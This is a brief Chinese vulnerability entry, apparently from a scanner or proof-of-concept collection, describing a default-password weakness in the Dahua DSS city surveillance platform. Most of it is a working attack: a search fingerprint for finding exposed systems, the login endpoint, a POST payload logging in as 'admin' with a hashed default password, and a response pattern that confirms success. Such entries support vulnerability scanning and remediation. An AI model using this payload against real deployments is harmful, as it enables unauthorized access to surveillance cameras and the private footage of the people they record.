# 大华DSS城市安防监控平台弱口令漏洞

大华 ｜ 默认口令 ｜ —
- **指纹**：`app="dahua-DSS"`
- **请求**：`POST /config/user_login.action?nowTime=1714373664321 HTTP/1.1`

**Payload**
```
userBean.loginName=admin&userBean.loginPass=dc0134141ec9319b6b4a00a75fc6a6f5
```
- **响应特征**：200 ^(?!.*?用户名或密码错误).*?$